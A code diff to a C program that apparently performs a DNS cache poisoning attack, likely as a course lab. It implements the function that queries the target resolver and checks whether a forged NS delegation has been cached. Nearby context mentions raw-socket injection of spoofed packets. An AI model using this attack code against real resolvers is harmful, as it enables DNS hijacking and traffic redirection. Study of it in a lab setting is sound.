@@ -43,7 +43,7 @@
 #define TCP_PORT    12345       // Port for receiving resolver port from server
 #define MAX_LEN_PORT 64
 // send at most 65536*20 spoofed packets in each attack attempt
-#define MAX_SPOOFED_PKTS   65536
+#define MAX_SPOOFED_PKTS 65536
 #define MAX_ROUNDS         20  // Maximum attack rounds to attempt
 
 /* raw socket for packet injection */
@@ -706,18 +706,121 @@ static void perform_attack_round(int round)
            round, successful_injections, MAX_SPOOFED_PKTS);
 }
 
-/* Check if poisoning succeeded by querying
- * www.example1.cybercourse.example.com via resolver and examining reply.
+/**
+ * check_poisoning - Verify if DNS cache poisoning succeeded
+ *
+ * Queries the resolver for www.example1.cybercourse.example.com and checks
+ * if the NS record in the authority section points to ns.example1.cybercourse.example.com.
+ * This indicates the cache has been poisoned with our malicious delegation.
+ *
+ * Returns: 1 if poisoning succeeded, 0 otherwise
  */
 static int check_poisoning(void)
 {
-    /* TODO:
-     * 1. Send DNS query (via UDP socket + ldns) to RESOLVER_IP:53
-     *    for www.example1.cybercourse.example.com.
-     * 2. Receive response and parse with ldns_wire2pkt().
-     * 3. Inspect A record: if IP == 6.6.6.6 -> success (return 1), else 0.
-     */
-    return 0;
+    const char *test_domain = "www.example1.cybercourse.example.com";
+    int sockfd;
+    struct sockaddr_in resolver_addr;
+    ldns_pkt *query = NULL;
+    ldns_pkt *response = NULL;
+    uint8_t *wire_query = NULL;
+    uint8_t wire_response[512];
+    size_t wire_query_len = 0;
+    ldns_status status;
+    int poisoned = 0;
+
+    // Create UDP socket
+    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sockfd < 0) {
+        perror("socket (check)");
+        return 0;
+    }
+
+    // Set receive timeout
+    struct timeval tv;
+    tv.tv_sec = 2;
+    tv.tv_usec = 0;
+    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+
+    // Build DNS query
+    query = ldns_pkt_query_new(
+        ldns_dname_new_frm_str(test_domain),
+        LDNS_RR_TYPE_A,
+        LDNS_RR_CLASS_IN,
+        LDNS_RD
+    );
+
+    if (!query) {
+        close(sockfd);
+        return 0;
+    }
+
+    // Serialize query
+    status = ldns_pkt2wire(&wire_query, query, &wire_query_len);
+    if (status != LDNS_STATUS_OK) {
+        ldns_pkt_free(query);
+        close(sockfd);
+        return 0;
+    }
+
+    // Setup resolver address
+    memset(&resolver_addr, 0, sizeof(resolver_addr));
+    resolver_addr.sin_family = AF_INET;
+    resolver_addr.sin_port = htons(DNS_PORT);
+    inet_pton(AF_INET, RESOLVER_IP, &resolver_addr.sin_addr);
+
+    // Send query
+    ssize_t sent = sendto(sockfd, wire_query, wire_query_len, 0,
+                          (struct sockaddr *)&resolver_addr,
+                          sizeof(resolver_addr));
+
+    if (sent < 0) {
+        perror("sendto (check)");
+        goto cleanup;
+    }
+
+    // Receive response
+    ssize_t recv_len = recvfrom(sockfd, wire_response, sizeof(wire_response),
+                                0, NULL, NULL);
+
+    if (recv_len < 0) {
+        // Timeout or error - poisoning might have failed
+        goto cleanup;
+    }
+
+    // Parse response
+    status = ldns_wire2pkt(&response, wire_response, (size_t)recv_len);
+    if (status != LDNS_STATUS_OK) {
+        goto cleanup;
+    }
+
+    // Check authority section for ns.example1.cybercourse.example.com
+    ldns_rr_list *authority = ldns_pkt_authority(response);
+    if (authority) {
+        for (size_t i = 0; i < ldns_rr_list_rr_count(authority); i++) {
+            ldns_rr *rr = ldns_rr_list_rr(authority, i);
+            if (ldns_rr_get_type(rr) == LDNS_RR_TYPE_NS) {
+                ldns_rdf *ns_rdf = ldns_rr_rdf(rr, 0);
+                if (ns_rdf) {
+                    char *ns_str = ldns_rdf2str(ns_rdf);
+                    if (ns_str && strstr(ns_str, "ns.example1.cybercourse.example.com")) {
+                        printf("\n✓ Cache poisoning detected! NS record: %s\n", ns_str);
+                        poisoned = 1;
+                        free(ns_str);
+                        break;
+                    }
+                    if (ns_str) free(ns_str);
+                }
+            }
+        }
+    }
+
+cleanup:
+    if (wire_query) free(wire_query);
+    if (query) ldns_pkt_free(query);
+    if (response) ldns_pkt_free(response);
+    close(sockfd);
+
+    return poisoned;
 }
 
 /* =======================
